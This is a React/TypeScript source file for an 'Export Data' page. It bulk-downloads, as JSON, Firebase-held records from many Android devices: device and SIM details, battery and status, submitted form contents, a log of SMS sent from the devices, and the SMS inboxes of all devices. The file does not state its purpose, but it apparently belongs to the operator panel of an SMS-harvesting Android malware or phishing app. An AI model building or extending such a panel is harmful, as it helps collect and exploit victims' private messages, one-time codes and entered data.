import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { useFirebaseUsers, useAllDeviceForms, useAllDevicesSentSMS, useAllDevicesSMS } from "@/hooks/useFirebaseData";
import { X, Download, Loader2, Smartphone, FileText, Send, MessageSquare, Database } from "lucide-react";
import { format } from "date-fns";
import { toast } from "sonner";

type ExportType = "devices" | "forms" | "sent_sms" | "all_sms" | "all_data";

const EXPORT_OPTIONS: { type: ExportType; label: string; desc: string; icon: React.ElementType }[] = [
  { type: "devices", label: "All Devices", desc: "Device info, battery, SIM, status", icon: Smartphone },
  { type: "forms", label: "All Forms", desc: "Form submissions from all devices", icon: FileText },
  { type: "sent_sms", label: "All Sent SMS", desc: "Outgoing messages log", icon: Send },
  { type: "all_sms", label: "All SMS", desc: "Inbox messages from all devices", icon: MessageSquare },
  { type: "all_data", label: "All Data", desc: "Everything combined in one file", icon: Database },
];

const ExportDataPage = () => {
  const navigate = useNavigate();
  const { users, loading: loadingUsers } = useFirebaseUsers();
  const { formsMap } = useAllDeviceForms();
  const { allSent, loading: loadingSent } = useAllDevicesSentSMS();
  const { allSms, loading: loadingSms } = useAllDevicesSMS();
  const [exporting, setExporting] = useState<ExportType | null>(null);

  const buildDevicesData = () =>
    Object.entries(users).map(([id, u]) => ({
      device_id: id,
      brand: u.brand,
      model: u.model,
      android_version: u.android_version,
      battery: u.battery,
      sim1: u.sim1,
      sim2: u.sim2,
      status: u.status,
      last_seen: u.timestamp ? format(new Date(u.timestamp), "yyyy-MM-dd HH:mm:ss") : "N/A",
    }));

  const buildFormsData = () =>
    Object.entries(formsMap).flatMap(([deviceId, forms]) =>
      forms.map((f) => ({
        device_id: deviceId,
        timestamp: f.timestamp ? format(new Date(f.timestamp), "yyyy-MM-dd HH:mm:ss") : "N/A",
        ...f.content,
      }))
    );

  const buildSentSmsData = () =>
    allSent.map((s) => ({
      device_id: s.deviceId,
      number: s.number,
      message: s.message,
      sim: s.sim,
      status: s.status,
      success: s.success,
      time: s.time ? format(new Date(s.time), "yyyy-MM-dd HH:mm:ss") : "N/A",
      error: s.error || "",
    }));

  const buildAllSmsData = () =>
    allSms.map((s) => ({
      device_id: s.deviceId || "",
      sender: s.sender,
      body: s.body,
      sim: s.sim,
      date: s.date ? format(new Date(s.date), "yyyy-MM-dd HH:mm:ss") : "N/A",
    }));

  const downloadJson = (data: unknown, filename: string) => {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  };

  const handleExport = (type: ExportType) => {
    setExporting(type);
    try {
      const ts = format(new Date(), "yyyyMMdd_HHmmss");
      switch (type) {
        case "devices":
          downloadJson(buildDevicesData(), `devices_${ts}.json`);
          break;
        case "forms":
          downloadJson(buildFormsData(), `forms_${ts}.json`);
          break;
        case "sent_sms":
          downloadJson(buildSentSmsData(), `sent_sms_${ts}.json`);
          break;
        case "all_sms":
          downloadJson(buildAllSmsData(), `all_sms_${ts}.json`);
          break;
        case "all_data":
          downloadJson(
            {
              devices: buildDevicesData(),
              forms: buildFormsData(),
              sent_sms: buildSentSmsData(),
              all_sms: buildAllSmsData(),
              exported_at: new Date().toISOString(),
            },
            `full_export_${ts}.json`
          );
          break;
      }
      toast.success("Export downloaded!");
    } catch {
      toast.error("Export failed");
    } finally {
      setExporting(null);
    }
  };

  const isLoading = loadingUsers || loadingSent || loadingSms;

  return (
    <div className="min-h-screen bg-background pb-28">
      <div className="sticky top-0 z-30 bg-background/80 backdrop-blur-xl border-b border-border px-4 pt-5 pb-4">
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2.5">
            <div className="h-10 w-10 rounded-xl bg-primary flex items-center justify-center">
              <Download className="h-5 w-5 text-primary-foreground" />
            </div>
            <div>
              <h1 className="text-lg font-extrabold text-foreground">Export Data</h1>
              <p className="text-[10px] text-muted-foreground">Download your data as JSON</p>
            </div>
          </div>
          <button
            onClick={() => navigate(-1)}
            className="h-9 w-9 rounded-xl bg-card border border-border flex items-center justify-center hover:bg-destructive/10 hover:text-destructive hover:border-destructive/30 transition-all"
          >
            <X className="h-4 w-4" />
          </button>
        </div>
      </div>

      <div className="px-4 pt-4 space-y-3">
        {isLoading ? (
          <div className="flex flex-col items-center justify-center py-20 gap-3">
            <Loader2 className="h-8 w-8 animate-spin text-primary" />
            <p className="text-sm text-muted-foreground">Loading data...</p>
          </div>
        ) : (
          <>
            {/* Export options */}
            {EXPORT_OPTIONS.map(({ type, label, desc, icon: Icon }) => (
              <button
                key={type}
                onClick={() => handleExport(type)}
                disabled={exporting !== null}
                className="w-full flex items-center gap-3 rounded-2xl border border-border bg-card p-4 hover:border-primary/30 hover:bg-primary/5 active:scale-[0.98] transition-all disabled:opacity-50"
              >
                <div className={`h-11 w-11 rounded-xl flex items-center justify-center shrink-0 ${type === "all_data" ? "bg-primary" : "bg-primary/10"}`}>
                  <Icon className={`h-5 w-5 ${type === "all_data" ? "text-primary-foreground" : "text-primary"}`} />
                </div>
                <div className="flex-1 text-left">
                  <p className="text-sm font-semibold text-foreground">{label}</p>
                  <p className="text-[10px] text-muted-foreground">{desc}</p>
                </div>
                {exporting === type ? (
                  <Loader2 className="h-4 w-4 animate-spin text-primary shrink-0" />
                ) : (
                  <Download className="h-4 w-4 text-muted-foreground shrink-0" />
                )}
              </button>
            ))}
          </>
        )}
      </div>
    </div>
  );
};

export default ExportDataPage;
